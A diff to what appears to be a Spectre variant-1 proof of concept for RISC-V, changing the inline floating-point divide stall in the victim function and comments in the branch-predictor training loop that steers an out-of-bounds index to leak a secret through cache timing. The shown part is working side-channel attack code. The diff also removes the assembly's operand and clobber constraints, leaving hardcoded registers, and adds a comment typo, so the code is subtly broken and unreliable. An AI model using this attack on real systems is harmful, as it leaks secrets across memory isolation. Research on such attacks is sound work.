@@ -10,6 +10,7 @@
 #define SECRET_SZ 26
 #define CACHE_HIT_THRESHOLD 50
 
+
 uint64_t array1_sz = 16;
 uint8_t unused1[64];
 uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
@@ -54,16 +55,13 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
 void victimFunc(uint64_t idx){
     uint8_t dummy = 2;
 
-    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
-    asm("fcvt.s.lu	fa4, %[in]\n"
-        "fcvt.s.lu	fa5, %[inout]\n"
+    // Stall branch resolution behind long latency FP
+    asm("fcvt.s.lu	fa4, a2\n"
+        "fcvt.s.lu	fa5, a1\n"
         "fdiv.s	fa5, fa5, fa4\n"
         "fdiv.s	fa5, fa5, fa4\n"
         "fdiv.s	fa5, fa5, fa4\n"
-        "fdiv.s	fa5, fa5, fa4\n"
-        : [out] "=r" (array1_sz)
-        : [inout] "r" (array1_sz), [in] "r" (dummy)
-        : "fa4", "fa5");
+        "fdiv.s	fa5, fa5, fa4\n");
 
     if (idx < array1_sz){
         dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
@@ -95,9 +93,11 @@ int main(void){
             for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                 // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                 // avoid jumps in case those tip off the branch predictor
-                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
+                // note: randIdx changes everytime the atkRound changes so that the tally does not get affectedl
                 //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
+                
                 randIdx = atkRound % array1_sz;
+
                 passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                 passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
